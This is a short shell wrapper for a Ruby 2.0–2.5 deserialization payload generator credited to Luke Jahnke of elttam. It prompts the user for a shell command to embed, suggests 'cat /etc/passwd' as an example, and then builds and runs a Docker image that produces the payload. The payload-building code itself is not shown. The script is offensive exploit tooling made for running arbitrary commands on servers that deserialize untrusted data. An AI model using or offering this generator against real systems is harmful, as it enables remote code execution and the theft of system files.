#!/bin/sh
printf "# Ruby 2.0 to 2.5 serialization payload generator\n"
printf "# Credit to Luke Jahnke from elttam\n\n"

printf "# Enter shell (script) payload:\n"
printf "# e.g: cat /etc/passwd\n"
read PAYLOAD

printf "# Building image...\n"
HASH=$(docker build -q .)

printf "# Running image...\n"
docker run -it --rm -e PAYLOAD="$PAYLOAD" $HASH
printf "^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n"

printf "# removing image...\n"
docker rmi $HASH
